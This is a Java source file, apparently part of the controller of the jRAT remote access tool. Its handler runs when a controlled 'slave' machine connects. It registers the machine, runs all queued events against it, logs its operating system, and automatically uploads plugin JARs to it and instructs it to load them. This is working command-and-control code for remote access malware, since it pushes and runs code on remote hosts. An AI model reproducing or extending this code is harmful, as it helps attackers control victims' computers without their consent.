package jrat.controller.packets.incoming;

import jrat.common.Logger;
import jrat.common.utils.JarUtils;
import jrat.controller.Globals;
import jrat.controller.OfflineSlave;
import jrat.controller.Slave;
import jrat.controller.addons.Plugins;
import jrat.controller.events.Event;
import jrat.controller.events.Events;
import jrat.controller.net.ConnectionHandler;
import jrat.controller.packets.outgoing.Packet101UploadPlugin;
import jrat.controller.packets.outgoing.Packet106ServerUploadPlugin;
import jrat.controller.settings.Settings;
import jrat.controller.settings.StatisticsOperatingSystem;
import jrat.controller.settings.StoreOfflineSlaves;
import jrat.controller.threads.ThreadUploadFile;
import java.io.DataInputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.jar.JarFile;
import jrat.api.Plugin;

public class Packet3Initialized extends AbstractIncomingPacket {

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		ConnectionHandler.addSlave(slave);

		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}

		StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
		StatisticsOperatingSystem.getGlobal().add(slave);

		List<String> plugins = new ArrayList<String>(Arrays.asList(slave.getPlugins()));
		List<String> notInstalled = new ArrayList<String>();

		if (plugins != null && Settings.getGlobal().getBoolean(Settings.KEY_TRANSFER_PLUGINS)) {
			for (Plugin plugin : Plugins.getPlugins()) {
				if (!plugins.contains(plugin.getName())) {
					notInstalled.add(plugin.getName());
					Logger.log("Plugin " + plugin.getName() + " is not installed, adding to list");
				}
			}

			Map<String, File> filesToTransfer = new HashMap<String, File>();

			for (String sp : notInstalled) {
				final Plugin plugin = Plugins.getPlugin(sp);
				File[] files = Globals.getPluginStubDirectory().listFiles();

				for (final File stubFile : files) {
					if (stubFile.getName().startsWith(plugin.getName())) {
						Logger.log("Found stub plugin " + stubFile.getName() + " for plugin " + plugin.getName());
						
						filesToTransfer.put(plugin.getName(), stubFile);
						
						Logger.log("Transferring " + plugin.getName());

						slave.addToSendQueue(new Packet106ServerUploadPlugin(stubFile, plugin.getName(), new ThreadUploadFile(null, plugin.getName(), stubFile) {
							@Override
							public void onComplete() {
								String mainClass = null;

								try {
									mainClass = JarUtils.getMainClassFromInfo(new JarFile(stubFile));
								} catch (Exception ex) {
									ex.printStackTrace();
									Logger.warn("Failed loading main class from plugin.txt");
									return;
								}
								
								slave.addToSendQueue(new Packet101UploadPlugin(mainClass, plugin.getName()));
							}
						}));
					}
				}
			}
		}
	}

}
